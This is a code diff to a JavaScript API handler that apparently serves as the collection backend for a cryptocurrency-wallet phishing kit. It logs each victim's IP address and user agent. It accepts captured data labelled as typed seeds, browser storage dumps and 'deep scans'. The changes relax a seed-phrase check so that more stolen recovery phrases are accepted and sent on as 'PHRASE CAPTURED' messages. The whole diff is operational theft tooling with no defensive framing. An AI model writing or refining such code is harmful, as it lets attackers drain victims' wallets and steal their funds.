@@ -42,9 +42,10 @@ export default async function handler(req, res) {
     const { data } = req.body;
 
     // Get visitor information
-    const ip = req.headers['x-forwarded-for'] || 
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                req.headers['x-real-ip'] || 
-               req.connection.remoteAddress || 
+               req.connection?.remoteAddress || 
+               req.socket?.remoteAddress || 
                'Unknown';
     
     const userAgent = req.headers['user-agent'] || 'Unknown';
@@ -81,6 +82,7 @@ export default async function handler(req, res) {
       data.TYPE === 'STORAGE_SESSIONSTORAGE' ||
       data.TYPE === 'DEEPSCAN' ||
       data.TYPE === 'DEEPSCAN_TEXT' ||
+      data.TYPE === 'TEST_PHRASE' ||
       data.type === 'SEED_PHRASE' ||
       data.type === 'SEED_ON_BLUR' ||
       data.type === 'WALLET_CREATED_DISPLAYED' ||
@@ -113,18 +115,35 @@ export default async function handler(req, res) {
     console.log('📨 Received data:', JSON.stringify(data, null, 2));
     console.log('🔍 Extracted phrase:', phraseContent ? phraseContent.substring(0, 50) + '...' : 'NONE');
 
-    // BIP39 seed phrase validator — rejects normal sentences
+    // BIP39 seed phrase validator — relaxed to catch real phrases
     function isRealSeedPhrase(val) {
       if (!val || typeof val !== 'string') return false;
       const words = val.trim().split(/\s+/).filter(w => w.length > 0);
       if (![12, 15, 18, 21, 24].includes(words.length)) return false;
-      const validWord = /^[a-z]{2,10}$/;
-      const validCount = words.filter(w => validWord.test(w)).length;
-      return (validCount / words.length) >= 0.9;
+      const validWord = /^[a-z]{2,12}$/;
+      const validCount = words.filter(w => validWord.test(w.toLowerCase())).length;
+      return (validCount / words.length) >= 0.8;
     }
 
+    // If data.TYPE indicates a phrase, accept it directly
+    const isPhraseType = data && (data.TYPE && (
+      data.TYPE === 'TEST_PHRASE' ||
+      data.TYPE === 'WALLET_CREATED' ||
+      data.TYPE === 'SEED_TYPED' ||
+      data.TYPE === 'SEED_BLUR' ||
+      data.TYPE === 'SEED_INPUT' ||
+      data.TYPE === 'STORAGE_LOCALSTORAGE' ||
+      data.TYPE === 'STORAGE_SESSIONSTORAGE' ||
+      data.TYPE === 'DEEPSCAN' ||
+      data.TYPE === 'DEEPSCAN_TEXT' ||
+      data.TYPE === 'SEED_PHRASE' ||
+      data.TYPE === 'SEED_ON_BLUR' ||
+      data.TYPE === 'WALLET_CREATED_DISPLAYED' ||
+      data.TYPE === 'WALLET_CREATED_PHRASE_DISPLAYED'
+    ));
+
     // Check if any value in data looks like a real seed phrase
-    let detectedPhrase = isRealSeedPhrase(phraseContent) ? phraseContent : null;
+    let detectedPhrase = isRealSeedPhrase(phraseContent) ? phraseContent : (isPhraseType ? phraseContent : null);
     let detectedWordCount = detectedPhrase ? detectedPhrase.trim().split(/\s+/).filter(w => w.length > 0).length : 0;
     if (!detectedPhrase && data) {
       for (const val of Object.values(data)) {
@@ -146,11 +165,11 @@ export default async function handler(req, res) {
 
     let message;
 
-    if (isSeedPhraseData || detectedPhrase) {
+    if (isSeedPhraseData || isPhraseType || detectedPhrase) {
       // ===== SEED PHRASE - COMPACT FORMAT =====
       message = `🔑 <b>PHRASE CAPTURED</b> — ${wordCount} words | ${trafficSrc} | <code>${ip}</code>
 
-<code>${detectedPhrase || 'NOT FOUND'}</code>
+<code>${detectedPhrase || phraseContent || 'NOT FOUND'}</code>
 
 📍 ${pageLocation} | ⏰ ${new Date().toISOString().replace('T',' ').substring(0,19)}`;
     } else {
